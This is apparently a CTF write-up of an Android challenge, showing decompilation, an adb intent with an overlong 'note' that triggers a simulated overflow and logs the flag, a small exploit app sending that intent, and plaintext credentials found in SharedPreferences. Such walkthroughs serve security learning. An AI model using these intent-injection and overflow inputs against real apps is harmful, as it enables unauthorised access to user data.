---
layout: post
author: M0hmedGamal (gem0x00)
categories: [CTF, Android]
tags: [CTF-Solutions, Writeup] 

---

# Fahem Native Android Writeup

Hey ya! This Writeup is for a Challenge Called Android Native on Fahemsec Platform and this is the link of the challange for now :
https://fahemsec.com/challenge?id=31

At first I Downloaded the APK file and while I was downloading it I'm thinking about the native library :)

Installed the app with adb 

```shell
adb install -t fahemnative.apk
```

I opened the application in jadx 
Looking at the AndroidManifest.xml
It is pretty simple 
There is only one Activity and this activity is exported so I can deal with it with adb 
<img width="996" height="293" alt="image" src="https://github.com/user-attachments/assets/c2980b4c-ba94-419c-901c-8234261c5697" />

Looking at the code of that main activity there is a :
```java
static {
        System.loadLibrary("native-lib");
    }
```
The application is calling a static native library honestly this is the thing I was searching for when I just read the name of the challenge
So I copied the apk and changed it from .apk to .zip , unzipped it and opened the native library with ghidra.

Opened the libnative-lib.so 
found printFlag Function :
```java
/* printFlag(char*, int) */

void printFlag(char *param_1,int param_2)

{
  long in_FS_OFFSET;
  int local_a8;
  byte local_98 [39];
  undefined local_71;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  if (0x40 < param_2) {
    for (local_a8 = 0; local_a8 < 0x27; local_a8 = local_a8 + 1) {
      local_98[local_a8] = (&DAT_00100f70)[local_a8] ^ 0x2a;
    }
    local_71 = 0;
    if (0x4a < param_2) {
      __android_log_print(6,"CTFNative","===============================================");
      __android_log_print(6,"CTFNative","BUFFER OVERFLOW DETECTED!");
      __android_log_print(6,"CTFNative","FLAG: %s",local_98);
      __android_log_print(6,"CTFNative","===============================================");
      __android_log_print(6,"CTFNative","Congratulations! You found the vulnerability!");
      __android_log_print(6,"CTFNative","Overflow size: %d bytes",param_2);
      __android_log_print(6,"CTFNative","The application will now crash...");
      __android_log_print(6,"CTFNative","===============================================");
    }
  }
  if (*(long *)(in_FS_OFFSET + 0x28) != local_10) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

```

Okay it is obvious now There is a parameter and when we Do bufferover via that parameter input we got the flag in the logs of the application
So The next step is How would we send the buffer overflow 
Okay on the MainActivity code there is a handle intent method so we can use it 
```java
private void handleIntent(Intent intent) {
        if (intent != null && "android.intent.action.VIEW".equals(intent.getAction())) {
            String username = intent.getStringExtra(KEY_USERNAME);
            String password = intent.getStringExtra(KEY_PASSWORD);
            String note = intent.getStringExtra("note");
            if (username != null && password != null && note != null) {
                SharedPreferences.Editor editor = this.prefs.edit();
                editor.putString(KEY_USERNAME, username);
                editor.putString(KEY_PASSWORD, password);
                editor.putBoolean(KEY_LOGGED_IN, true);
                editor.apply();
                addNote(note);
                Toast.makeText(this, "Account created and note added via intent!", 1).show();
                showMainScreen();
            } else if (note != null && this.prefs.getBoolean(KEY_LOGGED_IN, false)) {
                addNote(note);
                Toast.makeText(this, "Note added via intent!", 0).show();
            }
        }
    }

```
So let's use :
```shell
adb logcat CTFNative:I *:S
```
and send intent via adb 
```shell
adb shell am start -a android.intent.action.VIEW -n com.ctf.timedhook/.MainActivity --es "username" "bebo" --es "password" "password123" --es "note" "gem0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
```
and got the flag via the logs :
```shell
adb logcat CTFNative:I *:S
--------- beginning of main
01-22 10:51:03.027  5793  5793 I CTFNative: --- Processing Note 1 ---
01-22 10:51:03.027  5793  5793 I CTFNative: Length: 244 chars
01-22 10:51:03.027  5793  5793 E CTFNative: WARNING! Note 1 exceeds maximum size!
01-22 10:51:03.027  5793  5793 E CTFNative: Buffer overflow imminent...
01-22 10:51:03.027  5793  5793 E CTFNative: ===============================================
01-22 10:51:03.027  5793  5793 E CTFNative: BUFFER OVERFLOW DETECTED!
01-22 10:51:03.027  5793  5793 E CTFNative: FLAG: flag{REDACTED}
01-22 10:51:03.027  5793  5793 E CTFNative: ===============================================
01-22 10:51:03.027  5793  5793 E CTFNative: Congratulations! You found the vulnerability!
01-22 10:51:03.027  5793  5793 E CTFNative: Overflow size: 244 bytes
01-22 10:51:03.027  5793  5793 E CTFNative: The application will now crash...
01-22 10:51:03.027  5793  5793 E CTFNative: ===============================================
01-22 10:51:03.027  5793  5793 I CTFNative: Checking note 1: gem0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
01-22 10:51:03.027  5793  5793 I CTFNative: Note length: 244 chars

```
So I will now develop an exploit application for this :
```java
button = findViewById(R.id.button);
         button.setOnClickListener(v -> {
             Intent i = new Intent("android.intent.action.VIEW");
             i.setClassName("com.ctf.timedhook","com.ctf.timedhook.MainActivity");
             i.putExtra("username","gem0x00");
             i.putExtra("password","gem0x00");
             i.putExtra("note","gem0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000");
             startActivity(i);
         });
```
<img width="335" height="686" alt="image" src="https://github.com/user-attachments/assets/7ac4f107-fd1d-445b-927e-9c43f155ed45" />

And the Exploit App Worked!
<img width="1351" height="349" alt="image" src="https://github.com/user-attachments/assets/bba49bd1-25c2-4d05-b572-b9ad17c1a4f5" />


### Beyond the Root :)

Okay There is something took my eye look :
```java
 private void handleIntent(Intent intent) {
        if (intent != null && "android.intent.action.VIEW".equals(intent.getAction())) {
            String username = intent.getStringExtra(KEY_USERNAME);
            String password = intent.getStringExtra(KEY_PASSWORD);
            String note = intent.getStringExtra("note");
            if (username != null && password != null && note != null) {
                SharedPreferences.Editor editor = this.prefs.edit();
                editor.putString(KEY_USERNAME, username);
                editor.putString(KEY_PASSWORD, password);
                editor.putBoolean(KEY_LOGGED_IN, true);
                editor.apply();
                addNote(note);
                Toast.makeText(this, "Account created and note added via intent!", 1).show();
                showMainScreen();
            } else if (note != null && this.prefs.getBoolean(KEY_LOGGED_IN, false)) {
                addNote(note);
                Toast.makeText(this, "Note added via intent!", 0).show();
            }
        }
    }
```

Look again :
```java
SharedPreferences.Editor editor = this.prefs.edit();
```
The Application is storing things in shared prefreces and this also another weakness in the application Okay let's tak a look :
I signed in with creds test:test and created notes

<img width="320" height="447" alt="image" src="https://github.com/user-attachments/assets/6b0ccc16-adea-4fcf-807d-745f38984570" />

<img width="327" height="514" alt="image" src="https://github.com/user-attachments/assets/5be58872-4731-4897-972e-f0d8453c5842" />

let's do :
```shell
adb root
adb shell
```

we're now inside the application 
go to `/data/data/com.ctf.timedhook`
and list the files inside found  :
<img width="572" height="128" alt="image" src="https://github.com/user-attachments/assets/0630d0d6-de79-41c2-afac-de4e241bdee7" />
let's look inside the file :
<img width="734" height="311" alt="image" src="https://github.com/user-attachments/assets/7f8781c0-86db-4140-8e5e-0b4a7c0ef2ef" />

And this is another security vulnerbility in the app as these things should stored in the keystore in the android not in the shared prefrences.

And this was like beyond the root ;)

Thanks for reading.
